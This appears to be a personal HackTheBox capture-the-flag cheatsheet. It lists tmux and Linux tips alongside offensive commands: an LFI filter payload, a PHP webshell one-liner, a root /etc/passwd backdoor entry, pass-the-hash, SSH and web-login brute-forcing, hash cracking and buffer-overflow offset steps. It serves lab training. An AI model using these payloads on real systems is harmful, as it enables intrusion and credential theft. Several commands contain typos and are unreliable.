## Purpose

Cheatsheet for [HackTheBox](https://www.hackthebox.eu/) with common things to do while solving these CTF challenges.

Because a smart man once said:
> Never google twice.



## Linux General

`ctrl + r`

Search History reverse

## Run Script at startup

```
chmod 755 /path/to/the/script
update-rc.d /path/to/the/script defaults
```

`update-rc.d -f  /path/to/the/script remove`

Delete Script from defaults

## Vim

`i` for insert mode

`esc` to leave insert mode

To be continued with macros and all this handy shit

## Tmux

Config from [ippsec](https://www.youtube.com/watch?v=Lqehvpe_djs).
```
#set prefix
set -g prefix C-a
bind C-a send-prefix
unbind C-b

set -g history-limit 100000
set -g allow-rename off

bind-key j command-prompt -p "Join pan from:" "join-pane -s '%%'"
bind-key s command-prompt -p "Send pane to:" "joian-pane -t '%%'"

set-window-option -g mode-keys vi

run-shell /opt/tmux-logging/logging.tmux

```

First press the prefix `ctrl + a`, *then* release the buttons and press the combination you want.

`tmux new -s [Name]`

new named session

`prefix + c`

create new window

`prefix + ,`

Rename window

`prefix + #`

change panes

`prefix + w`

list windows

`prefix + % `

vertical split

`prefix + "`

horizontal split

`prefix + s #`

join pane

`prefix + z`

zoom in/out to panes 

`prefix + !`

make splitted part to own window

`prefix + ]`

enter vim mode
-> search with `?` in vi mode
-> press `space` to start copying
-> press `prefix + ]` to paste

`alt + .`

cycle through arguments in history

`tmux kill-session -t X`

kill session by tag

`prefix + &`

kill pane

## Nmap 

`nmap -sV -sC -p- -oN [FILE] [IP]`

Standard

`nmap -p- -sV -sC -A  --min-rate 1000 --max-retries 5 -oN [FILE] [IP]`

Faster But ports could be overseen because of retransmissoin cap

`nmap --script vuln -oN [FILE] [IP]`


## Local File Inclusion
`http://[IP]/index.php?file=php://filter/convert.base64-encode/resource=index.php`

Get the contents of all PHP files in base64 without executing them. 

`<?php echo passthru($_GET['cmd']); ?>`

PHP Webshell

## Upgrade Shell

`python -c'import pty; pty.spawn("/bin/bash")'`

Background Session with `ctrl + z`

`stty raw -echo`

`stty -a`

get row & col

`stty rows X columns Y`

Set rows and cols

Foreground Session again

`fg #jobnumber`

`export XTERM=xterm-color`

enable clear
## Add Account/Password to /etc/passwd

Generate password

`openssl passwd -1 -salt [Username] [PASSWD]`

Then Add to passwd file

`Username:generated password:UID:GUID:root:/root:/bin/bash`

## SQLMap 

Capture Request with Burp.

Save Request to File.

`sqlmap -r [REQUEST] --level [X] --risk [Y]`

## Use SSH Key

Download & save

It is necessary to change the permissions on the key file otherwise you have to enter a password!

`chmod 600 [KEY]`

`ssh -i [KEY] [IP]`

## Searchsploit

`searchsploit [TERM]`

`searchsploit -m exploits/solaris/local/19232.txt`

Copy to local directory

## Convert RPM Package to deb

`alien [Pakage.rpm]`

## Bufferoverflows

Locate Overflow

`patter_create.rb -l [SIZE]`

Start gdb and run 

`r [PATTERN]`

Copy the segfault String

`pattern_offset.rb [SEGFAULT STRING]`

Receive Match at exact offset X.

Now you know you have at X the EIP override and so much space in the buffer.

## Simple exploit developement

Get Information about the binary. 

`checksec [Binary]`

Search [packetstrom](https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html) for Shellcode.

Remember to use correct architecture.

## Work in progress above...

## SNMP

Bruteforce community string

`nmap -sU -p 161 [IP] -Pn --script=snmp-brute`

`onesixtyone -c /usr/share/doc/onesixtyone/dict.txt [IP]`

Community String is in both cases "private"

`snmp-check [IP] -c public`

`snmpwalk -c public [IP] -v 2c`

## Hydra

`hydra -l root -p admin 192.168.1.105 -t 4 ssh`

`hydra -L root -P File 192.168.1.105 -t 4 ssh`

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.X http-post-form "/login:username=^USER^&password=^PASS^:F=failed"`

## John the ripper

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

## Crack zip Files

`fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' "file.zip"`

Note: Be careful with the quotes!

# Crack openssl encrypted files

```
#!bin/bash
for password in $(cat /usr/share/wordlists/rockyou.txt)
do 
openssl enc -d -aes-256-cbc -a -in file.txt.enc -k $password -out $password-drupal.txt
done
```

After this you get one file for every Password tried. 

`ls -lS`

Sort them by size and find the one unique size. Or try to grep the content.


## Pass the hash smb

With nt hash the `--pw-nt-hash` flag is needed, default is ntlm!

`pth-smbclient \\\\10.10.10.107\\$ -W <DOMAIN> -U <USER> -L <IP> --pw-nt-hash <HASH>`

List all shares on <HOST>.
  
`pth-smbclient \\\\10.10.10.107\\<SHAR> -W <DOMAIN> -U <USER> --pw-nt-hash <HASH>`

Connect to <SHARE>.
  
## FTP

`wget -r ftp://user:pass@server.com/`

Recursively download with ftp.

## SMB Null Session

`smbclient //10.10.10.X/IPC$ -W Workgroup -I 10.10.10.X -U ""`


## WFUZZ 

`wfuzz -z range,1-65600 --hc 500  "http://IP:PORT/dir?parameter=id&port=FUZZ"`

Fuzz a range of ids/port numbers.


## Wordlist with crunch

`crunch 15 15 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ*?=walkthrough%&0123456789" -t 123456789012345@ > wordlist.txt
`

## hashcat

```
sha256 
hashcat --force -m 1400 --username hash.txt /usr/share/wordlists/rockyou.txt 
```

## Basic Auth Bruteforcing 

[Link](http://www.dailysecurity.net/2013/03/22/http-basic-authentication-dictionary-and-brute-force-attacks-with-burp-suite/)
